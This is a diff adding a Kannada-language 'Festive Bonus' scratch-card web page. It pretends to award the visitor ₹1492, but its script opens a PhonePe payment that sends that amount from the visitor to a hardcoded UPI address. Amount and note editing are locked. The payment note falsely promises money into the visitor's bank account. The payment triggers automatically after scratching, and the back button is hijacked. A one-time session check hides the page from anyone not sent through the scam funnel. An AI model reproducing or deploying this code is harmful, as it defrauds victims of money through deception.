@@ -1,0 +1,587 @@
+<?php
+session_start();
+
+if (
+    !isset($_SESSION['one_time_token']) ||
+    !isset($_SESSION['allowed_page']) ||
+    $_SESSION['allowed_page'] !== 'Kannada'
+) {
+    echo '<!DOCTYPE html><html><body></body></html>';
+    exit;
+}
+
+unset($_SESSION['one_time_token']);
+unset($_SESSION['allowed_page']);
+?>
+<!doctype html>
+<html lang="en">
+
+
+
+<head>
+    <meta charset="utf-8">
+    <title>Festive Bonus</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="preload" href="https://s3storagewgateway.s3.ap-south-1.amazonaws.com/lol/scratch-overlay.png" as="image">
+    <link rel="preload" href="https://s3storagewgateway.s3.ap-south-1.amazonaws.com//lol/reward-image.png" as="image">
+    
+    <link rel="stylesheet" href="img/style.css">
+
+    <style>
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .imgs {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .popup {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .popup img {
+            width: 50px;
+            margin: 10px;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+
+        .popup img:hover {
+            transform: scale(1.2);
+        }
+
+        .popup h3 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .close-btn {
+            background: #e74c3c;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            margin-top: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .success-message {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #4CAF50;
+            color: white;
+            padding: 30px 50px;
+            border-radius: 10px;
+            font-size: 24px;
+            z-index: 2000;
+            text-align: center;
+        }
+
+        .reward-container {
+            display: none;
+            width: 100%;
+            max-width: 320px;
+            margin: 20px auto;
+            text-align: center;
+        }
+
+        .reward-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .scratch-container {
+            position: relative;
+            width: 100%;
+            max-width: 256px;
+            margin: 5px auto;
+            touch-action: none;
+        }
+
+        .scratch-container canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            cursor: crosshair;
+            touch-action: none;
+        }
+
+        .scratch-container .reveal-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .amount-overlay {
+            position: absolute;
+            bottom: 8%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 51px;
+            font-weight: bold;
+            color: #000000;
+            font-family: Arial, sans-serif;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .scratch-container canvas {
+            z-index: 2;
+        }
+
+        .money-rain-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+            overflow: hidden;
+        }
+
+        .money-rain-overlay.active {
+            display: block;
+        }
+
+        .money {
+            position: absolute;
+            top: -100px;
+            font-size: 40px;
+            animation: fall linear forwards;
+            z-index: 999;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(-100px) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(110vh) rotate(720deg);
+                opacity: 0.8;
+            }
+        }
+
+        .jackpot-text {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            font-size: 48px;
+            font-weight: bold;
+            color: #FFD700;
+            text-shadow: 2px 2px 4px #000, 0 0 20px #FFD700, 0 0 40px #FFA500;
+            z-index: 1001;
+            animation: jackpotPop 0.5s ease-out forwards;
+            white-space: nowrap;
+        }
+
+        @keyframes jackpotPop {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.2);
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+
+        .gold-burst {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            width: 300px;
+            height: 300px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255,215,0,0.8) 0%, rgba(255,165,0,0.4) 40%, transparent 70%);
+            border-radius: 50%;
+            z-index: 1000;
+            animation: burst 1s ease-out forwards;
+            pointer-events: none;
+        }
+
+        @keyframes burst {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(3);
+                opacity: 0;
+            }
+        }
+
+        .top-banner-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .timer-overlay {
+            position: absolute;
+            bottom: 18%;
+            left: 12%;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            font-family: 'Arial', sans-serif;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+        }
+
+        .timer-overlay .timer-icon {
+            font-size: 22px;
+        }
+
+        .timer-overlay span {
+            color: white;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="money-rain-overlay" id="moneyRain"></div>
+
+    <div class="success-message" id="successMessage">
+        Thank you for participating!
+    </div>
+
+
+    <a class="pay-link" href="#">
+        <div class="top-banner-wrapper">
+            <img src="https://s3storagewgateway.s3.ap-south-1.amazonaws.com/lol/Top.png" width="100%" height="auto">
+            <div class="timer-overlay" id="timerDisplay">
+                <span class="timer-icon">⏱</span>
+                <span id="timerMinutes">04</span>:<span id="timerSeconds">59</span>
+            </div>
+        </div>
+    </a>
+
+    <div class="scratch-container" id="js-container">
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+
+        <img src="https://s3storagewgateway.s3.ap-south-1.amazonaws.com/lol/reward-image.png" class="reveal-image" id="reveal-img">
+        <div class="amount-overlay" id="rewardAmount">₹1497</div>
+        <canvas id="js-canvas"></canvas>
+    </div>
+
+    <a class="pay-link" href="#">
+        <div>
+            <img src="https://s3storagewgateway.s3.ap-south-1.amazonaws.com/lol/Bot.png" width="100%" height="auto">
+        </div>
+    </a>
+
+    <script>
+        // ========== PAYMENT SETTINGS - CHANGE VALUES HERE ==========
+        window.upiAddress = 'paytm.s24quqy@pty';
+        window.paymentAmount = 1492;
+        window.paymentNote = 'ಅಭಿನಂದನೆಗಳು! ಹಸಿರು ಬಟನ್ ಮೇಲೆ ಕ್ಲಿಕ್ ಮಾಡಿ ಹಣವನ್ನು ನೇರವಾಗಿ ಬ್ಯಾಂಕ್ ಖಾತೆಯಲ್ಲಿ ಪಡೆಯಿರಿ।👇';
+        // ============================================================
+        
+        // Update scratch card amount display
+        document.getElementById('rewardAmount').textContent = '₹' + window.paymentAmount;
+        
+        window.openPhonePe = function() {
+            var paymentData = {
+                contact: {
+                    cbcName: "",
+                    nickName: "",
+                    vpa: window.upiAddress,
+                    type: "VPA"
+                },
+                p2pPaymentCheckoutParams: {
+                    note: window.paymentNote,
+                    isByDefaultKnownContact: true,
+                    enableSpeechToText: false,
+                    allowAmountEdit: false,
+                    showQrCodeOption: false,
+                    disableViewHistory: true,
+                    shouldShowUnsavedContactBanner: false,
+                    isRecurring: false,
+                    checkoutType: "DEFAULT",
+                    transactionContext: "p2p",
+                    initialAmount: window.paymentAmount * 100,
+                    disableNotesEdit: true,
+                    showKeyboard: true,
+                    currency: "INR",
+                    shouldShowMaskedNumber: true
+                }
+            };
+            
+            var jsonStr = JSON.stringify(paymentData);
+            var encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
+            var phonepeUrl = 'phonepe://native?data=' + encodeURIComponent(encodedData) + '&id=p2ppayment';
+            
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'Purchase', {
+                    value: window.paymentAmount,
+                    currency: 'INR'
+                });
+            }
+            
+            window.location.href = phonepeUrl;
+        };
+        
+        const payLinks = document.querySelectorAll('.pay-link');
+        payLinks.forEach((link) => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                window.openPhonePe();
+            });
+        });
+        
+        (function() {
+            var totalSeconds = 4 * 60 + 59;
+            var timerMinutes = document.getElementById('timerMinutes');
+            var timerSeconds = document.getElementById('timerSeconds');
+            
+            function updateTimer() {
+                var minutes = Math.floor(totalSeconds / 60);
+                var seconds = totalSeconds % 60;
+                timerMinutes.textContent = minutes.toString().padStart(2, '0');
+                timerSeconds.textContent = seconds.toString().padStart(2, '0');
+                
+                if (totalSeconds > 0) {
+                    totalSeconds--;
+                    setTimeout(updateTimer, 1000);
+                }
+            }
+            
+            updateTimer();
+        })();
+    </script>
+
+    <script>
+        (function() {
+            'use strict';
+            var isDrawing = false, lastPoint = null;
+            var container = document.getElementById('js-container'),
+                canvas = document.getElementById('js-canvas'),
+                revealImg = document.getElementById('reveal-img'),
+                ctx = canvas.getContext('2d'),
+                overlayImage = new Image(),
+                brush = new Image();
+            var canvasWidth, canvasHeight;
+
+            overlayImage.crossOrigin = "anonymous";
+            overlayImage.src = "scratch-overlay.png";
+
+            overlayImage.onload = function() {
+                canvasWidth = overlayImage.width;
+                canvasHeight = overlayImage.height;
+                canvas.width = canvasWidth;
+                canvas.height = canvasHeight;
+                ctx.drawImage(overlayImage, 0, 0, canvasWidth, canvasHeight);
+            };
+
+            brush.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAJFSURBVGiB7dpLSJRRGMbx/0cta9G2XERBi4gWLiJatWkTBBEEQdAmaFMQUbtA3LQKgjYtKloELQq6LIqgRRRBEJRQi4ggukNgq5ZlZab/FucMDs6MM+PMfIPzh8HvzDln3vOc73LOGUM2CDASmJJWEMCIGH8nsBv4GZZJLiOLgJtJ1xkBHALOAMuyKqIJEGnYs+5/ZCIhIcV8YHFBhSQtpJT2tJLR1wlpcY04n0mL/Vu0VVxKMk1JQUMdYHjYKYWIfX0L6JyM+y5hhwJHgRvAp4TrjCC0vU5J1xkBbAeWJl1nxGmr2IREXFZ+S20LpRjS7M9aJI0gzUJS+wEqhO2AHYCryHlgCrAkzjqjmVgtJLRO6QTZyqYZ4A+wH9gDfE+yzgjiQKzqZLsgXwS8EudbQZuETuAK8BGYBUyIq85o4haS2sZeQXYBO4DPCdcZTdxC0vrxKQipZwHo10KeBJYQvqPE+Qzk/4Qpk+fAI2CbD3EB2AnMBvakWG/EBfK3BI4BtwCbN7VD/d+VoUvIQaCXKOQIYJ5/+y5wFNgNvEuzzoj7U9r1R/tYxS+CU+j/EHsLOJe0nRHHBHI5cBjoAkqBE4T2WHDH0CnhMNAJzAKeAmuS0h5xQSPIkNBHQmJZH/KCw8RDoBRYRbCXwHzgBLCKINKuO+KCRpAhqtMJjAemARUEv6w6gAdp1xtx+pD6EeNDhv8SpIUsIWgkKJQR2IYAq4Gpadc/xMU/p0R+GnEmzlqiPxL8BHiSdL0R9wN1C/wBnU/EjgAAAABJRU5ErkJggg==';
+
+            canvas.addEventListener('mousedown', handleMouseDown);
+            canvas.addEventListener('touchstart', handleMouseDown, { passive: false });
+            canvas.addEventListener('mousemove', handleMouseMove);
+            canvas.addEventListener('touchmove', handleMouseMove, { passive: false });
+            canvas.addEventListener('mouseup', handleMouseUp);
+            canvas.addEventListener('touchend', handleMouseUp);
+            document.addEventListener('mouseup', handleMouseUp);
+            document.addEventListener('touchend', handleMouseUp);
+
+            function distanceBetween(point1, point2) {
+                return Math.sqrt(Math.pow(point2.x - point1.x, 2) + Math.pow(point2.y - point1.y, 2));
+            }
+
+            function angleBetween(point1, point2) {
+                return Math.atan2(point2.x - point1.x, point2.y - point1.y);
+            }
+
+            function getFilledInPixels(stride) {
+                if (!stride || stride < 1) stride = 1;
+                if (!canvasWidth || !canvasHeight) return 0;
+                var pixels = ctx.getImageData(0, 0, canvasWidth, canvasHeight),
+                    pdata = pixels.data,
+                    l = pdata.length,
+                    total = (l / stride),
+                    count = 0;
+                for (var i = count = 0; i < l; i += stride) {
+                    if (parseInt(pdata[i]) === 0) count++;
+                }
+                return Math.round((count / total) * 100);
+            }
+
+            function getMouse(e, canvas) {
+                var rect = canvas.getBoundingClientRect();
+                var scaleX = canvas.width / rect.width;
+                var scaleY = canvas.height / rect.height;
+                var mx, my;
+                if (e.touches) {
+                    mx = (e.touches[0].clientX - rect.left) * scaleX;
+                    my = (e.touches[0].clientY - rect.top) * scaleY;
+                } else {
+                    mx = (e.clientX - rect.left) * scaleX;
+                    my = (e.clientY - rect.top) * scaleY;
+                }
+                return { x: mx, y: my };
+            }
+
+            window.scratchCompleted = false;
+            window.phonepeOpened = false;
+            
+            function startMoneyRain() {
+                var overlay = document.getElementById('moneyRain');
+                overlay.classList.add('active');
+                
+                var burst = document.createElement('div');
+                burst.className = 'gold-burst';
+                document.body.appendChild(burst);
+                
+                var moneySymbols = ['💵', '💰', '💴', '💶', '💷', '🪙', '💸'];
+                var totalMoney = 50;
+                
+                for (var i = 0; i < totalMoney; i++) {
+                    (function(index) {
+                        setTimeout(function() {
+                            var money = document.createElement('div');
+                            money.className = 'money';
+                            money.innerHTML = moneySymbols[Math.floor(Math.random() * moneySymbols.length)];
+                            money.style.left = Math.random() * 100 + '%';
+                            money.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                            money.style.fontSize = (Math.random() * 20 + 30) + 'px';
+                            overlay.appendChild(money);
+                            
+                            setTimeout(function() {
+                                if (money.parentNode) money.parentNode.removeChild(money);
+                            }, 4000);
+                        }, index * 60);
+                    })(i);
+                }
+                
+                setTimeout(function() {
+                    if (burst.parentNode) burst.parentNode.removeChild(burst);
+                }, 1000);
+            }
+            
+            function handlePercentage(filledInPixels) {
+                filledInPixels = filledInPixels || 0;
+                if (filledInPixels > 40 && !window.scratchCompleted) {
+                    window.scratchCompleted = true;
+                    if (canvas && canvas.parentNode) canvas.parentNode.removeChild(canvas);
+                    var elems = document.getElementsByClassName("confetti");
+                    for (var i = 0; i < elems.length; i++) {
+                        elems[i].style.visibility = 'visible';
+                    }
+                    
+                    startMoneyRain();
+                    
+                    setTimeout(function() {
+                        if (!window.phonepeOpened) {
+                            window.phonepeOpened = true;
+                            window.openPhonePe();
+                        }
+                    }, 3000);
+                    
+                    document.addEventListener('click', function() {
+                        if (window.scratchCompleted && !window.phonepeOpened) {
+                            window.phonepeOpened = true;
+                            window.openPhonePe();
+                        }
+                    });
+                }
+            }
+
+            function handleMouseDown(e) {
+                isDrawing = true;
+                lastPoint = getMouse(e, canvas);
+            }
+
+            function handleMouseMove(e) {
+                if (!isDrawing) return;
+                e.preventDefault();
+                var currentPoint = getMouse(e, canvas),
+                    dist = distanceBetween(lastPoint, currentPoint),
+                    angle = angleBetween(lastPoint, currentPoint),
+                    x, y;
+                
+                ctx.globalCompositeOperation = 'destination-out';
+                ctx.lineJoin = 'round';
+                ctx.lineCap = 'round';
+                ctx.lineWidth = 104;
+                
+                ctx.beginPath();
+                ctx.moveTo(lastPoint.x, lastPoint.y);
+                ctx.lineTo(currentPoint.x, currentPoint.y);
+                ctx.stroke();
+                
+                lastPoint = currentPoint;
+                handlePercentage(getFilledInPixels(32));
+            }
+
+            function handleMouseUp(e) {
+                isDrawing = false;
+            }
+        })();
+    </script>
+
+    <script>
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function(e) {
+            history.pushState(null, null, location.href);
+            alert('Click on the button to receive the money');
+        });
+    </script>
+
+    <!-- Meta Pixel Code - loaded last for performance -->
+    
+    <!-- End Meta Pixel Code -->
+</body>
+
+
+
+</html>
